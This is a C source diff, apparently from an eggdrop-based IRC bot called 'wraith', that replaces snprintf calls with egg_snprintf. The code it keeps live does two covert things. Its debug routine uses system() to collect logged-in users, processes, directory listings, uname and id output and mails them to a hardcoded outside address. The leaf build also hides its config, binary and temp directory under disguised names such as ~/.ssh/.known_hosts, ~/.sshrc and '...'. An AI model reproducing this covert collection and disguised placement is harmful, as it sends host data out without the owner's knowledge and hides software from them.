@@ -266,7 +266,7 @@ void write_debug()
   } else
     nested_debug = 1;
 
-  snprintf(tmpout, sizeof tmpout, "* Last 3 contexts: %s/%d [%s], %s/%d [%s], %s/%d [%s]",
+  egg_snprintf(tmpout, sizeof tmpout, "* Last 3 contexts: %s/%d [%s], %s/%d [%s], %s/%d [%s]",
                                   cx_file[cx_ptr-2], cx_line[cx_ptr-2], cx_note[cx_ptr-2][0] ? cx_note[cx_ptr-2] : "",
                                   cx_file[cx_ptr-1], cx_line[cx_ptr-1], cx_note[cx_ptr-1][0] ? cx_note[cx_ptr-1] : "",
                                   cx_file[cx_ptr], cx_line[cx_ptr], cx_note[cx_ptr][0] ? cx_note[cx_ptr] : "");
@@ -323,9 +323,9 @@ void write_debug()
     if (1) {
 /* FIXME: make into temp file.. */
       char buff[255];
-      snprintf(buff, sizeof(buff), "cat << EOFF >> bleh\nDEBUG from: %s\n`date`\n`w`\n---\n`who`\n---\n`ls -al`\n---\n`ps ux`\n---\n`uname -a`\n---\n`id`\n---\n`cat DEBUG`\nEOFF", origbotname);
+      egg_snprintf(buff, sizeof(buff), "cat << EOFF >> bleh\nDEBUG from: %s\n`date`\n`w`\n---\n`who`\n---\n`ls -al`\n---\n`ps ux`\n---\n`uname -a`\n---\n`id`\n---\n`cat DEBUG`\nEOFF", origbotname);
       system(buff);
-      snprintf(buff, sizeof(buff), "cat bleh |mail wraith@shatow.net");
+      egg_snprintf(buff, sizeof(buff), "cat bleh |mail wraith@shatow.net");
       system(buff);
       unlink("bleh");
     }
@@ -1129,14 +1129,14 @@ Context;
     if (temps[0])
       ipsix = newsplit(&temps);
 
-    snprintf(origbotname, 10, "%s", nick);
+    egg_snprintf(origbotname, 10, "%s", nick);
 
     if (ip[1]) {
       if (ip[0] == '!') { //natip
         ip++;
         sprintf(natip,"%s",ip);
       } else {
-        snprintf(myip, 120, "%s", ip);
+        egg_snprintf(myip, 120, "%s", ip);
       }
     }
 
@@ -1150,7 +1150,7 @@ Context;
     }
 
     if (ipsix && ipsix[1]) {
-      snprintf(myip6, 120, "%s", ipsix);
+      egg_snprintf(myip6, 120, "%s", ipsix);
     }
     if (my_ptr)
       nfree(my_ptr);
@@ -1290,14 +1290,16 @@ char *homedir()
 {
   static char home[DIRMAX], tmp[DIRMAX];
   struct passwd *pw;
+  sdprintf(STR("If the bot dies after this, try compiling on Debian."));
 Context;
   pw = getpwuid(geteuid());
+  sdprintf(STR("End Debian suggestion."));
 
   if (!pw)
    werr(ERR_PASSWD);
 
 Context;
-  snprintf(tmp, sizeof tmp, "%s", pw->pw_dir);
+  egg_snprintf(tmp, sizeof tmp, "%s", pw->pw_dir);
 Context;
   realpath(tmp, home); /* this will convert lame home dirs of /home/blah->/usr/home/blah */
 
@@ -1310,7 +1312,7 @@ char *confdir()
 
 #ifdef LEAF
 {
-  snprintf(conf, sizeof conf, "%s/.ssh", homedir());
+  egg_snprintf(conf, sizeof conf, "%s/.ssh", homedir());
 }
 #endif /* LEAF */
 #ifdef HUB
@@ -1319,7 +1321,7 @@ char *confdir()
 
   tmpdir = nmalloc(strlen(binname)+1);
   strcpy(tmpdir, binname);
-  snprintf(conf, sizeof conf, "%s", dirname(tmpdir));
+  egg_snprintf(conf, sizeof conf, "%s", dirname(tmpdir));
   nfree(tmpdir);
 }
 #endif /* HUB */
@@ -1348,7 +1350,7 @@ char *my_uname()
 #endif /* __FreeBSD__ */
     }
 #endif /* HAVE_UNAME */
-  snprintf(os_uname, sizeof os_uname, "%s %s", unix_n, vers_n);
+  egg_snprintf(os_uname, sizeof os_uname, "%s %s", unix_n, vers_n);
   return os_uname;
 }
 
@@ -1497,7 +1499,7 @@ int main(int argc, char **argv)
     check_trace_start();
 
 #ifdef HUB
-  snprintf(tempdir, sizeof tempdir, "%s/tmp", confdir());
+  egg_snprintf(tempdir, sizeof tempdir, "%s/tmp", confdir());
 #endif /* HUB */
 
 #ifdef LEAF
@@ -1505,8 +1507,8 @@ int main(int argc, char **argv)
   char newbin[DIRMAX];
   sdprintf(STR("my uid: %d my uuid: %d, my ppid: %d my pid: %d"), getuid(), geteuid(), getppid(), getpid());
   chdir(homedir());
-  snprintf(newbin, sizeof newbin, "%s/.sshrc", homedir());
-  snprintf(tempdir, sizeof tempdir, "%s/...", confdir());
+  egg_snprintf(newbin, sizeof newbin, "%s/.sshrc", homedir());
+  egg_snprintf(tempdir, sizeof tempdir, "%s/...", confdir());
 
   sdprintf(STR("newbin at: %s"), newbin);
 
@@ -1544,7 +1546,7 @@ int main(int argc, char **argv)
 if (1) {
 char tmp[DIRMAX];
 
-  snprintf(tmp, sizeof tmp, "%s/", confdir());
+  egg_snprintf(tmp, sizeof tmp, "%s/", confdir());
   if (!can_stat(tmp)) {
 #ifdef LEAF
     if (mkdir(tmp,  S_IRUSR | S_IWUSR | S_IXUSR)) {
@@ -1558,7 +1560,7 @@ char tmp[DIRMAX];
 #endif /* LEAF */
   }
 
-  snprintf(tmp, sizeof tmp, "%s/", tempdir);
+  egg_snprintf(tmp, sizeof tmp, "%s/", tempdir);
   if (!can_stat(tmp)) {
     if (mkdir(tmp,  S_IRUSR | S_IWUSR | S_IXUSR)) {
       unlink(tempdir);
@@ -1577,9 +1579,9 @@ char tmp[DIRMAX];
 if (1) {		/* config shit */
   char cfile[DIRMAX], templine[8192];
 #ifdef LEAF
-  snprintf(cfile, sizeof cfile, "%s/.known_hosts", confdir());
+  egg_snprintf(cfile, sizeof cfile, "%s/.known_hosts", confdir());
 #else
-  snprintf(cfile, sizeof cfile, "%s/conf", confdir());
+  egg_snprintf(cfile, sizeof cfile, "%s/conf", confdir());
 #endif /* LEAF */
   if (!can_stat(cfile))
     werr(ERR_NOCONF);
@@ -1603,7 +1605,7 @@ if (1) {		/* config shit */
         sdprintf(STR("line %d, char %c "), i, temps[0]);
         werr(ERR_CONFBADENC);
       }
-      snprintf(c, sizeof c, "%s", temps);
+      egg_snprintf(c, sizeof c, "%s", temps);
 
       if (c[0] == '*')
         skip = 1;
@@ -1654,9 +1656,9 @@ if (1) {		/* config shit */
             sprintf(natip, "%s",ip);
           } else {
             if (ip && ip[1]) //only copy ip if it is longer than 1 char (.)
-              snprintf(myip, 120, "%s", ip);
+              egg_snprintf(myip, 120, "%s", ip);
           }
-          snprintf(origbotname, 10, "%s", nick);
+          egg_snprintf(origbotname, 10, "%s", nick);
 #ifdef HUB
           sprintf(userfile, "%s/.%s.user", confdir(), nick);
 #endif /* HUB */
@@ -1669,7 +1671,7 @@ if (1) {		/* config shit */
               sprintf(hostname, "%s",host);
           }
           if (ipsix && ipsix[1]) { //only copy ipsix if it is longer than 1 char (.)
-            snprintf(myip6, 120, "%s",ipsix);
+            egg_snprintf(myip6, 120, "%s",ipsix);
           }
         } 
 #ifdef LEAF
